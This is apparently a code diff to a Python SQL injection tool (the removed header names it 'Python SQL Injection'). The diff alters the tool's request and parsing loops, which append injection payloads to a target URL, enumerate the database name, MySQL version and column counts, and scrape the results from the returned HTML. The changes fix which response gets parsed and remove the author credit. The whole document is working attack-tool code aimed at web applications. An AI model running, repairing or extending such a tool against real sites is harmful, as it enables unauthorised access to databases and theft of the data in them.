@@ -1,6 +1,4 @@
-# Python SQL Injection
-# V 1.1.5
-# Copyright : Pham Chien
+# SQL
 import requests
 import os
 import re
@@ -117,9 +115,8 @@ for payload in payload_name_bypass_1:
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(new_payload))
                             print("[+] LINK : {}{}".format(url, new_payload))
-                            print("")
                             print("Output : ")
-                            html_content = result_1.text
+                            html_content = check.text
                             get = BeautifulSoup(html_content, 'html.parser')
                             output_1 = get.find_all('h1')
                             output_2 = get.find_all('h2')
@@ -129,13 +126,14 @@ for payload in payload_name_bypass_1:
                             print("")
                             print("")
                             print("----------------------------")
+                            check = requests.get(url + query1)
                             print("database name mysql")
                             print("PARAMETER : database name")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query1))
                             print("[+] LINK : {}{}".format(url, query1))
                             print("Output : ")
-                            html_content = result_1.text
+                            html_content = check.text
                             get = BeautifulSoup(html_content, 'html.parser')
                             output_1 = get.find_all('h1')
                             output_2 = get.find_all('h2')
@@ -145,13 +143,14 @@ for payload in payload_name_bypass_1:
                             print("")
                             print("")
                             print("----------------------------")
+                            check = requests.get(url + query2)
                             print("version name mysql")
                             print("PARAMETER : version")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query2))
                             print("[+] LINK : {}{}".format(url, query2))
                             print("Output : ")
-                            html_content = result_1.text
+                            html_content = check.text
                             get = BeautifulSoup(html_content, 'html.parser')
                             output_1 = get.find_all('h1')
                             output_2 = get.find_all('h2')
@@ -192,12 +191,17 @@ for payload in payload_name_bypass_1:
                                     print("----------------------------")
                                     print("find columns : {}".format(text_check))
                                     print("PARAMETER : 1")
+                                    print("")
                                     print("[:] URL : {}".format(url))
+                                    print("")
                                     print("[:] NUM COLUMNS : {}".format(text_check))
+                                    print("")
                                     print("[:] PAYLOAD : {}".format(payloads_1))
+                                    print("")
                                     print("[:] LINK : {}{}".format(url, payloads_1))
+                                    print("")
                                     print("Output : ")
-                                    html_content = result_1.text
+                                    html_content = get_dbms.text
                                     get = BeautifulSoup(html_content, 'html.parser')
                                     output_1 = get.find_all('h1')
                                     output_2 = get.find_all('h2')
@@ -242,7 +246,7 @@ for payload in payload_name_bypass_1:
                                     print("[:] PAYLOAD : {}".format(payloads_1))
                                     print("[:] LINK : {}{}".format(url, payloads_1))
                                     print("Output : ")
-                                    html_content = result_1.text
+                                    html_content = get_dbms.text
                                     get = BeautifulSoup(html_content, 'html.parser')
                                     output_1 = get.find_all('h1')
                                     output_2 = get.find_all('h2')
@@ -257,7 +261,7 @@ for payload in payload_name_bypass_1:
                                 end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                                 exit(end_time)
                     else:
-                        print("[!] The column number is not appropriate, or incorrect, please try again later")
+                        print("The column number is not appropriate, or incorrect, please try again later")
                         end_time = datetime.datetime.now().strftime("Ending Time : %H:%M:%S - /%d/%m/%Y")
                         exit(end_time)
 
@@ -286,7 +290,7 @@ for payload in payload_name_bypass_1:
                             print("[+] PAYLOAD : {}".format(new_payload))
                             print("[+] LINK : {}{}".format(url, new_payload))
                             print("Output : ")
-                            html_content = result_1.text
+                            html_content = check.text
                             get = BeautifulSoup(html_content, 'html.parser')
                             output_1 = get.find_all('h1')
                             output_2 = get.find_all('h2')
@@ -296,13 +300,14 @@ for payload in payload_name_bypass_1:
                             print("")
                             print("")
                             print("----------------------------")
+                            check = requests.get(url + query1)
                             print("database name mysql")
                             print("PARAMETER : database name")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query1))
                             print("[+] LINK : {}{}".format(url, query1))
                             print("Output : ")
-                            html_content = result_1.text
+                            html_content = check.text
                             get = BeautifulSoup(html_content, 'html.parser')
                             output_1 = get.find_all('h1')
                             output_2 = get.find_all('h2')
@@ -312,13 +317,14 @@ for payload in payload_name_bypass_1:
                             print("")
                             print("")
                             print("----------------------------")
+                            check = requests.get(url + query2)
                             print("version name mysql")
                             print("PARAMETER : version")
                             print("[+] URL : {}".format(url))
                             print("[+] PAYLOAD : {}".format(query2))
                             print("[+] LINK : {}{}".format(url, query2))
                             print("Output : ")
-                            html_content = result_1.text
+                            html_content = check.text
                             get = BeautifulSoup(html_content, 'html.parser')
                             output_1 = get.find_all('h1')
                             output_2 = get.find_all('h2')
@@ -369,7 +375,7 @@ for payload in payload_name_bypass_1:
                                     print("[:] LINK : {}{}".format(url, payloads_1))
                                     print("")
                                     print("Output : ")
-                                    html_content = result_1.text
+                                    html_content = get_dbms.text
                                     get = BeautifulSoup(html_content, 'html.parser')
                                     output_1 = get.find_all('h1')
                                     output_2 = get.find_all('h2')
@@ -414,7 +420,7 @@ for payload in payload_name_bypass_1:
                                     print("[:] PAYLOAD : {}".format(payloads_1))
                                     print("[:] LINK : {}{}".format(url, payloads_1))
                                     print("Output : ")
-                                    html_content = result_1.text
+                                    html_content = get_dbms.text
                                     get = BeautifulSoup(html_content, 'html.parser')
                                     output_1 = get.find_all('h1')
                                     output_2 = get.find_all('h2')
